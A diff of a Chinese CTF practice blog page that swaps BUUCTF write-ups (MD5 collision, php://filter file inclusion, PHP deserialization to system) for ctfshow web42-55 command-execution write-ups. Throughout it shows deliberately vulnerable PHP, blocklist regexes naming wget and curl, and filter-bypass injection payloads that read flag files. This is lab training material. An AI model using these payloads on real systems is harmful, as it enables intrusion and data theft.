(preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>所以就是get传一个cmd</p>
-<p>post传a和b</p>
-<p>a和b是md5强碰撞</p>
-<p>cmd没什么限制（doge）</p>
-<p><img src="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240508213547847.png" alt="image-20240508213547847"></p>
-<p>所以尝试一下</p>
-<p>现在还有一个函数sort没有被禁，也是可以读取文件的</p>
-<p>所以我们要找一找flag在哪个文件里面</p>
-<p>试试能不能l&#x2F;s绕过吧</p>
-<p>强碰撞如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240508221254586.png" alt="image-20240508221254586"></p>
-<p>c\at &#x2F;flag拿到flag</p>
+<p>奇奇怪怪的东西</p>
+<p>但是都是ascii可以找到的</p>
+<p>尝试rot47解密</p>
+<p>成功</p>
+<p>GXY{Y0u_kNow_much_about_Rot}</p>
 
             
         </div>
@@ -572,12 +404,12 @@
         
         
     </div>
-    <a href="/2024/05/08/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/" class="go-post">阅读全文</a>
+    <a href="/2024/06/11/buu%E5%88%B7%E9%A2%98%E9%9B%86-crypto/GXYCTF2019-CheckIn/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2020-Had-a-bad-day/">
-        <h2 class="post-title">[BSidesCF 2020]Had a bad day</h2>
+    <a href="/2024/06/11/ctfshow/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+        <h2 class="post-title">ctfshow</h2>
     </a>
     <div class="category-and-date">
         
@@ -585,7 +417,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/5/7
+            2024/6/11
         </span>
         
         
@@ -593,86 +425,274 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2020-Had-a-bad-day/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507220210629.png" alt="image-20240507220210629"></p>
-<p>cheer不了一点，毕竟是学网安的</p>
-<p>这里可以看到只有两个选项，所以我们想查看一下其他的东西</p>
-<p>可以使用伪协议进行读取</p>
-<p>（我觉得只要直接传入参数看不到东西的时候就用伪协议）</p>
-<p>base64解码之后读取到源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">	$file = $_GET[&#x27;category&#x27;];</span><br><span class="line">	if(isset($file))</span><br><span class="line">	&#123;</span><br><span class="line">		if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">			include ($file . &#x27;.php&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">			</span><br></pre></td></tr></table></figure>
+            <h4 id="Web42"><a href="#Web42" class="headerlink" title="Web42"></a>Web42</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
 
-<p>这里保留了php代码部分，因为基本上不会是前端出问题</p>
-<p>在这里能看出来，这是要传woofers或者meowers上去</p>
-<p>换句话说就是你传上去的东西里面必须包含了其中一个字符串</p>
-<p>所以我们可以采取文件包含</p>
-<p>比如woofers&#x2F;..&#x2F;flag</p>
-<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2020-Had-a-bad-day/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507221250137.png" alt="image-20240507221250137"></p>
-<p>发现了这个！</p>
-<p>所以我么尝试使用伪协议读取（一般读不出来都用伪协议试试）</p>
-<p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=meowers/../flag</span><br></pre></td></tr></table></figure>
+<p>&#x2F;dev&#x2F;null 2&gt;&amp;1，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p>
+<p>这是本题的核心</p>
+<p>就是因为后面会让所有的输入的全部被弃掉</p>
+<p>所以我们要阻止后面的发生</p>
+<p>所以我们可以使用||</p>
+<p><img src="file:///C:\Users\汪涵裕\AppData\Local\Temp\ksohtml26060\wps2.jpg" alt="img"> </p>
+<p>所以</p>
+<p>ls||</p>
+<p><img src="file:///C:\Users\汪涵裕\AppData\Local\Temp\ksohtml26060\wps3.jpg" alt="img"> </p>
+<p>cat flag.php||即可</p>
+<h4 id="Web43"><a href="#Web43" class="headerlink" title="Web43"></a>Web43</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">   if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>回显出一段字符串，base64解码</p>
-<p>得到flag</p>
+<p>多过滤了一个cat</p>
+<p>使用tac即可</p>
+<h4 id="Web44"><a href="#Web44" class="headerlink" title="Web44"></a>Web44</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/BSidesCF-2020-Had-a-bad-day/" class="go-post">阅读全文</a>
-</div>
+<p>过滤了flag</p>
+<p>通配符绕过即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac ????.???||</span><br></pre></td></tr></table></figure>
 
-<div class="post">
-    <a href="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/">
-        <h2 class="post-title">[网鼎杯 2020 朱雀组]phpweb</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/5/7
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507213032149.png" alt="image-20240507213032149"></p>
-<p>我只能说很抽象</p>
-<p>因为看它一直闪啊闪，我猜测可能有问题，抓个包试试</p>
-<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507213344380.png" alt="image-20240507213344380"></p>
-<p>发现两个参数我们试试</p>
-<p>date函数是咋用的来着？</p>
-<p>date(Y-m-d h:i:s a)</p>
-<p>好像是这个，所以大概率就是a(b)的形式</p>
-<p>所以尝试打开index.php</p>
-<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507213638501.png" alt="image-20240507213638501"></p>
-<p>发现源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        if ($a == &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func = &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">    if ($func != null) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            die(&quot;Hacker...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="Web45"><a href="#Web45" class="headerlink" title="Web45"></a>Web45</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>禁用了许多函数，这里看到了class，想到了序列化，如果func传一个unserialize后面再传序列化的命令应该可以绕过</p>
-<p>尝试一下，先看看能不能成功，尝试一下ls</p>
-<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507215018774.png" alt="image-20240507215018774"></p>
-<p>诶嘿，全都看见喽</p>
-<p>所以是可行的，所以之后可以用上我跟大佬学的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find+/+-name+flag*</span><br></pre></td></tr></table></figure>
+<p>过滤了空格</p>
+<p>可以考虑$IFS绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla*.php||</span><br></pre></td></tr></table></figure>
 
-<p>查找所有带flag的</p>
-<p>嘻嘻</p>
-<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507215224689.png" alt="image-20240507215224689"></p>
-<p>之后就一个个找过去吧，先从下面找，我觉得不会放那么里面吧</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="Web46"><a href="#Web46" class="headerlink" title="Web46"></a>Web46</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>增加过滤了$、*和数字，没什么太大影响</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09????.???||</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web47"><a href="#Web47" class="headerlink" title="Web47"></a>Web47</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了几个读取flag的函数</p>
+<p>直接继续使用上一题的payload即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09????.???||</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web48"><a href="#Web48" class="headerlink" title="Web48"></a>Web48</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续过滤了更多的读取函数</p>
+<p>但是还是没有过滤tac，可以继续使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09????.???||</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web49"><a href="#Web49" class="headerlink" title="Web49"></a>Web49</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本题过滤了%</p>
+<p>但是传参之后先进行url编码再进行判定，所以%09依旧可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09????.???||</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web50"><a href="#Web50" class="headerlink" title="Web50"></a>Web50</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>依旧是没过滤tac</p>
+<p>但是过滤了%09</p>
+<p>所以要尝试换一种方法绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac&lt;&gt;????.???||</span><br></pre></td></tr></table></figure>
+
+<p>发现没用？</p>
+<p>原来是&lt;&gt;不能和?一起用，所以换一种方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure>
+
+<p>成功！</p>
+<h4 id="Web51"><a href="#Web51" class="headerlink" title="Web51"></a>Web51</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>震惊！！！</p>
+<p>过滤了tac，完蛋，但是没完全完蛋</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure>
 
 <p>嘻嘻</p>
-<p><img src="/2024/05/07/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240507215354779.png" alt="image-20240507215354779"></p>
-<p>OK了</p>
+<h4 id="Web52"><a href="#Web52" class="headerlink" title="Web52"></a>Web52</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>？少过滤了一个$ ？</p>
+<p>哦，原来是过滤了&lt;&gt;</p>
+<p>那就可以使用{$IFS}绕过了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fla\g.php||</span><br></pre></td></tr></table></figure>
+
+<p>不对？</p>
+<p>尝试看看文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=ls$&#123;IFS&#125;/||</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240611152345273.png" alt="image-20240611152345273"></p>
+<p>所以说文件都换了是吧</p>
+<p>好好好</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;/flag||</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<h4 id="Web53"><a href="#Web53" class="headerlink" title="Web53"></a>Web53</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        echo($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;.$d;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;no&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了好多欸，但是跟上一题怎么感觉差不多啊</p>
+<p>对了，它没有null那种东西了，所以我们直接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;????.???</span><br></pre></td></tr></table></figure>
+
+<p>拿下！！！</p>
+<h4 id="Web54"><a href="#Web54" class="headerlink" title="Web54"></a>Web54</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤的好啊，好啊</p>
+<p>这个时候就需要看看有没有其它读取文件可以用的函数了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=uniq$&#123;IFS&#125;????.???</span><br><span class="line">?c=grep$&#123;IFS&#125;&#x27;&#123;&#x27;$&#123;IFS&#125;fl???php</span><br><span class="line">（在 fl???php匹配到的文件中，查找含有&#123;的文件，并打印出包含 &#123; 的这一行）</span><br></pre></td></tr></table></figure>
+
+<p>uniq和grep，使用方法如上</p>
+<h4 id="Web55"><a href="#Web55" class="headerlink" title="Web55"></a>Web55</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我没有技，怎么炫…</p>
+<p>过了所有字母和一些符号</p>
+<p>那我咋玩</p>
+<p>所以我们看看大佬的解题</p>
+<p>方法一：</p>
+<p>没有过滤数字，所以想一想查看文件的命令有没有数字开头的</p>
+<p>匹配到&#x2F;bin目录下的命令<br><code>cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</code><br>发现存在一个<code>base64</code><br>我们就可以通过<code>通配符</code>进行匹配命令执行查看flag.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br><span class="line">意思是 /bin/base64 flag.php</span><br></pre></td></tr></table></figure>
+
+<p>方法二：</p>
+<p>bzip2是linux下面的压缩文件的命令 关于bzip2命令的具体介绍<br>&#x2F;usr&#x2F;bin目录:</p>
+<p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等。</p>
+<p>我们可以利用&#x2F;usr&#x2F;bin下的bzip2</p>
+<p>意思就是说我们先将flag.php文件进行压缩，然后再将其下载<br>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/???/????2 ????.???</span><br><span class="line">也就是/usr/bin/bzip2 flag.php</span><br></pre></td></tr></table></figure>
+
+<p>方法三：</p>
+<p>无数字webshell脚本</p>
